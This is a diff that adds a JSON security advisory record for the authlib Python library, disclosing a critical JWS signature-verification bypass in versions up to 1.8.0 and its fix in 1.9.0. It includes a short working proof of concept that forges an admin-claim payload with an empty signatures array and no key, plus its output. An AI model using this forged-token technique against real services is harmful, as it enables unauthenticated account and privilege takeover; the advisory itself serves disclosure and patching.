@@ -1,0 +1,68 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-10-27T14:50:19Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "authlib"
+  },
+  "Advisory": {
+    "DatabaseId": 522534,
+    "Id": "GSA_kwCzR0hTQS02djM4LTRoN3ctcmo5aM4AB_km",
+    "GhsaId": "GHSA-6v38-4h7w-rj9h",
+    "References": [
+      {
+        "Url": "https://github.com/authlib/authlib/security/advisories/GHSA-6v38-4h7w-rj9h"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96760"
+      },
+      {
+        "Url": "https://github.com/authlib/authlib/pull/938"
+      },
+      {
+        "Url": "https://github.com/authlib/authlib/commit/6c11a02da8730914cea08ec195f1108a40dc6733"
+      },
+      {
+        "Url": "https://github.com/authlib/authlib/releases/tag/v1.9.0"
+      },
+      {
+        "Url": "https://kb.cert.org/vuls/id/762428"
+      },
+      {
+        "Url": "https://www.kb.cert.org/vuls/id/762428"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-6v38-4h7w-rj9h"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-6v38-4h7w-rj9h"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-96760"
+      }
+    ],
+    "Description": "Authlib (prior to 1.9.0) contains a signature verification bypass vulnerability. The JsonWebSignature.deserialize_json() method accepts a JSON Serialization JWS object and returns the payload as successfully verified without checking for a signature and without requiring a cryptographic key.\n\n## Root cause\n\n`authlib/jose/rfc7515/jws.py`, read on the installed 1.8.0 artifact:\n\n```python\nis_valid = True                        # set before anything is checked\nfor header_obj in obj[\"signatures\"]:   # empty array means the body never runs\n    jws_header, valid = self._validate_json_jws(...)\n    if not valid:\n        is_valid = False\n...\nif is_valid:\n    return rv                          # returns the payload as verified\n```\n\n`is_valid` is initialised to `True` and only ever set to `False` from inside the loop. A JWS JSON\nSerialization object whose `signatures` array is empty iterates zero times, so the flag survives and\nthe payload is returned as successfully verified. No key is consulted, because no signature is\nexamined.\n\n## Reproduction\n\n```python\nimport base64\nfrom authlib.jose import JsonWebSignature\n\ndef b64(b):\n    return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\njws = JsonWebSignature()\npayload = b'{\"sub\":\"attacker\",\"role\":\"admin\"}'\nforged = {\"payload\": b64(payload), \"signatures\": []}\n\nprint(jws.deserialize_json(forged, key=None))\n```\n\nObserved on authlib 1.8.0, Python 3.14, clean virtualenv:\n\n```\n[A] ATTACK   general JSON, signatures:[] , key=None\n    ACCEPTED  -\u003e {'header': [], 'payload': b'{\"sub\":\"attacker\",\"role\":\"admin\"}'}\n[B] ATTACK   general JSON, signatures:[] , key=\u003creal key\u003e\n    ACCEPTED  -\u003e {'header': [], 'payload': b'{\"sub\":\"attacker\",\"role\":\"admin\"}'}\n[C] CONTROL+ genuine general JSON with 2 signatures, right key\n    ACCEPTED (expected) payload= b'{\"sub\":\"attacker\",\"role\":\"admin\"}'\n[D] CONTROL- same object, first signature corrupted\n    rejected (expected): BadSignatureError bad_signature:\n[E] CONTROL- signatures array removed entirely (not empty, absent)\n    rejected: DecodeError Missing \"protected\" value:\n```\n\n[C] proves the verifier works normally on a genuine object, so a deployment looks healthy. [D] proves\ntampering is caught. [E] proves this is specifically the empty-array case and not a general\nmissing-member bug. [A] and [B] are the bypass, and [B] shows that holding the correct key does not\nsave a caller: the empty array is accepted either way.\n\nFor comparison, joserfc 1.7.5, the library this module's deprecation warning points users to, rejects\nthe identical object with `BadSignatureError`. The correct behaviour already exists in your newer\nlibrary.\n\n## Impact\n\nAny relying party that calls `JsonWebSignature.deserialize_json()` on input it did not produce will\naccept an attacker-authored payload as signed. Where that payload carries identity or authorisation\nclaims, this is a complete authentication bypass by an unauthenticated remote caller with no key\nmaterial. \n\n## What would fix it\n\nIn `_deserialize_json`, reject an empty `signatures` array before the loop, or initialise the flag\nfrom the signature count, for example `is_valid = len(obj[\"signatures\"]) \u003e 0`. Pull request #938\nproposes the same thing.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-10-27T14:50:18Z",
+    "Severity": "CRITICAL",
+    "Summary": "Authlib: empty signatures validation in JWS JSON deserialization",
+    "UpdatedAt": "2026-10-27T14:50:19Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.1,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.9.0"
+      },
+      "VulnerableVersionRange": "\u003c= 1.8.0"
+    }
+  ]
+}
